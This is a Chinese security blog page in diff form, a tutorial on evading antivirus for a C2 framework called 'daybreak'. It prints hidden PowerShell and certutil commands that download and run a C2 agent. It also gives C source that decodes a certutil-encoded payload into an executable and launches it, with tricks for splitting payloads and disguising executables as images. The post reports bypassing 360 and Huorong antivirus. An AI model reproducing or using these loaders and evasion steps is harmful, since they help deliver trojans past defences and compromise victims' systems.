@@ -1,0 +1,248 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>进阶免杀1.0 | 墨水彩笔</title><meta name="author" content="墨水彩笔"><meta name="copyright" content="墨水彩笔"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="破晓免杀新伙伴-daybreak，这个工具是类似CS的工具 下面的图片是它的控制界面，利用了Web界面更加简介美观且自带中文     分析一下它自带的上线语句   支持多种操作系统的上线，相比CS需要按照插件才能上线linux更加集成 支持利用powershell和certutil指令进行上线操作 123powershell.exe -ExecutionPolicy bypass -noprofi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="进阶免杀1.0">
+<meta property="og:url" content="http://example.com/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="破晓免杀新伙伴-daybreak，这个工具是类似CS的工具 下面的图片是它的控制界面，利用了Web界面更加简介美观且自带中文     分析一下它自带的上线语句   支持多种操作系统的上线，相比CS需要按照插件才能上线linux更加集成 支持利用powershell和certutil指令进行上线操作 123powershell.exe -ExecutionPolicy bypass -noprofi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2023-03-27T07:05:01.000Z">
+<meta property="article:modified_time" content="2023-03-28T03:27:35.379Z">
+<meta property="article:author" content="墨水彩笔">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2023-03-28 11:27:35'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">76</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%B4%E6%99%93"><span class="toc-number">1.</span> <span class="toc-text">破晓</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">初步测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8360%E7%8E%AF%E5%A2%83%E4%B8%8B%E6%B5%8B%E8%AF%95"><span class="toc-number">2.0.1.</span> <span class="toc-text">在360环境下测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%81%AB%E7%BB%92%E7%8E%AF%E5%A2%83%E4%B8%8B%E8%BF%90%E8%A1%8C"><span class="toc-number">2.0.2.</span> <span class="toc-text">在火绒环境下运行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.0.3.</span> <span class="toc-text">进行文件分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6"><span class="toc-number">3.</span> <span class="toc-text">进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%81%AB%E7%BB%92%E7%8E%AF%E5%A2%83%E4%B8%8B"><span class="toc-number">3.0.1.</span> <span class="toc-text">火绒环境下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#360%E7%8E%AF%E5%A2%83%E4%B8%8B"><span class="toc-number">3.0.2.</span> <span class="toc-text">360环境下</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%80%E5%B7%A7%E4%B8%80%EF%BC%88%E7%BC%9D%E5%90%88%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">技巧一（缝合）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%80%E5%B7%A7%E4%BA%8C%EF%BC%88%E5%86%B7%E7%9F%A5%E8%AF%86%EF%BC%89"><span class="toc-number">4.0.1.</span> <span class="toc-text">技巧二（冷知识）</span></a></li></ol></li></ol></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">进阶免杀1.0</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-03-27T07:05:01.000Z" title="Created 2023-03-27 15:05:01">2023-03-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-03-28T03:27:35.379Z" title="Updated 2023-03-28 11:27:35">2023-03-28</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="破晓"><a href="#破晓" class="headerlink" title="破晓"></a>破晓</h1><p>免杀新伙伴-daybreak，这个工具是类似CS的工具</p>
+<p>下面的图片是它的控制界面，利用了Web界面更加简介美观且自带中文</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327153435782.png" class title="image-20230327153435782">
+
+
+
+<p>分析一下它自带的上线语句</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327153615913.png" class title="image-20230327153615913">
+
+<p>支持多种操作系统的上线，相比CS需要按照插件才能上线linux更加集成</p>
+<p>支持利用powershell和certutil指令进行上线操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile(&#39;http:&#x2F;&#x2F;127.0.0.1:1338&#x2F;d&#x2F;pzxsnoqd&#39;,&#39;pzxsnoqd.exe&#39;) &amp;&amp; pzxsnoqd.exe agent -u http:&#x2F;&#x2F;127.0.0.1:1338 -s e75tdmwe</span><br><span class="line"></span><br><span class="line">certutil -urlcache -gmt -split -f http:&#x2F;&#x2F;127.0.0.1:1338&#x2F;d&#x2F;pzxsnoqd pzxsnoqd.exe &amp;&amp; pzxsnoqd.exe agent -u http:&#x2F;&#x2F;127.0.0.1:1338 -s e75tdmwe</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是破晓的上线操作需要利用探针的参数才行，比如这里的e75tdmwe</p>
+<h1 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h1><p>我们将自带的命令进行编译生成exe文件直接尝试上线</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327153933061.png" class title="image-20230327153933061">
+
+
+
+<h3 id="在360环境下测试"><a href="#在360环境下测试" class="headerlink" title="在360环境下测试"></a>在360环境下测试</h3><img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327154054627.png" class title="image-20230327154054627">
+
+<p>静态免杀没问题，尝试上线</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327154124668.png" class title="image-20230327154124668">
+
+<p>上线失败被阻止</p>
+<h3 id="在火绒环境下运行"><a href="#在火绒环境下运行" class="headerlink" title="在火绒环境下运行"></a>在火绒环境下运行</h3><p>静态云查杀依旧没有问题</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327154307012.png" class title="image-20230327154307012">
+
+<p>尝试上线</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327154332140.png" class title="image-20230327154332140">
+
+<p>果然还是被组织了</p>
+<h3 id="进行文件分析"><a href="#进行文件分析" class="headerlink" title="进行文件分析"></a>进行文件分析</h3><p>效果显示很不错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;gui&#x2F;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327154544199.png" class title="image-20230327154544199">
+
+<p>这个就更离谱了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.virscan.org&#x2F;language&#x2F;zh-cn&#x2F;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327154617956.png" class title="image-20230327154617956">
+
+
+
+
+
+<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><p>通过利用certutil自带的加解密功能进行木马的免杀</p>
+<p>加密代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certutil -encode C+Powershell.exe out.txt</span><br></pre></td></tr></table></figure>
+
+<p>C语言源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char automobie[50];</span><br><span class="line">    ofstream outfile;</span><br><span class="line">    #将解密的内容写入一个文件中</span><br><span class="line">    outfile.open(&quot;encryption.txt&quot;);</span><br><span class="line">    outfile.setf(ios_base::showpoint);</span><br><span class="line">    outfile &lt;&lt; &quot;-----BEGIN CERTIFICATE-----\n&quot;</span><br><span class="line">		#C2文件加密的内容</span><br><span class="line">		&quot;-----END CERTIFICATE-----\n&quot;</span><br><span class="line">            &lt;&lt; endl;</span><br><span class="line">    outfile.close();</span><br><span class="line">    #进行解密</span><br><span class="line">    system(&quot;Certutil -decode encryption.txt test.exe&quot;);</span><br><span class="line">    #确保上述代码运行完成</span><br><span class="line">    Sleep(5000);</span><br><span class="line">    system(&quot;test.exe C2执行参数&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再次编译生成exe文件，点击运行，首先产生一个解码文件，然后再次产生可执行文件，最终达到上线，下图时</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327163200178.png" class title="image-20230327163200178">
+
+
+
+<h3 id="火绒环境下"><a href="#火绒环境下" class="headerlink" title="火绒环境下"></a>火绒环境下</h3><p>发现成功产生了解密文件和木马文件，但木马文件运行时仍出现告警</p>
+<h3 id="360环境下"><a href="#360环境下" class="headerlink" title="360环境下"></a>360环境下</h3><p>我没想到火绒杀了，联网的360居然没杀，成功上线</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327163128064.png" class title="image-20230327163128064">
+
+<p>进行360木马查杀中的快速查杀，居然还没杀掉</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327164111480.png" class title="image-20230327164111480">
+
+
+
+
+
+<h1 id="技巧一（缝合）"><a href="#技巧一（缝合）" class="headerlink" title="技巧一（缝合）"></a>技巧一（缝合）</h1><p>当我们利用certutil进行的时候，会发现我们加密后的数据过于冗长可能会在上传过程中遇到很多问题，那么我们可以利用文件切割，再利用我们的COPY指令进行缝合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.txt+2.txt+...+n.txt  out.txt</span><br></pre></td></tr></table></figure>
+
+<p>最后利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -decode out.txt   C2可执行文件名.exe</span><br></pre></td></tr></table></figure>
+
+<p>我们通过以下命令进行加密，产生txt文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certutil -encode C+Powershell.exe out.txt</span><br></pre></td></tr></table></figure>
+
+<p>利用文本切割器，按照每500行一份进行切割</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文本切割器网站</span><br><span class="line">https:&#x2F;&#x2F;uutool.cn&#x2F;txt-incise&#x2F;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327170409366.png" class title="image-20230327170409366">
+
+<p>我们将文本缝合后利用certutil进行解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -decode out.txt test.exe</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327170454304.png" class title="image-20230327170454304">
+
+<p>运行木马程序</p>
+<p>火绒报错</p>
+<p>360在文本进行编译成exe后直接报警</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327170732130.png" class title="image-20230327170732130">
+
+<h3 id="技巧二（冷知识）"><a href="#技巧二（冷知识）" class="headerlink" title="技巧二（冷知识）"></a>技巧二（冷知识）</h3><p>windows命令行，中执行命令对文件判断时，不是判断文件后缀而是判断文件头，因此如果我们是exe文件，我们修改后缀为jpg等依旧可以额执行命令</p>
+<p>测试代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char automobie[50];</span><br><span class="line">    ofstream outfile;</span><br><span class="line">    outfile.open(&quot;encryption.txt&quot;);</span><br><span class="line">    outfile.setf(ios_base::showpoint);</span><br><span class="line">    outfile &lt;&lt; &quot;-----BEGIN CERTIFICATE-----\n&quot;</span><br><span class="line"></span><br><span class="line">&quot;-----END CERTIFICATE-----\n&quot;</span><br><span class="line">            &lt;&lt; endl;</span><br><span class="line">    outfile.close();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行命令执行</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327172739414.png" class title="image-20230327172739414">
+
+<p>命令执行结果</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/image-20230327172713203.png" class title="image-20230327172713203">
+
+<p>但当我们想直接在C中将解密后的文件修改后缀再启动时，会遇到以下错误，解密文件会产生成功但无法执行</p>
+<img src="/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/JBQ%5B_I1XN%7D7N%5B%5D_%7DZJZ%7DGIR.png" class title="img"></div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">墨水彩笔</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/">http://example.com/2023/03/27/%E8%BF%9B%E9%98%B6%E5%85%8D%E6%9D%801-0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">免杀基础</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/17/ThinkPHP5-0-24%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">ThinkPHP5.0.24漏洞复现</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 墨水彩笔</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
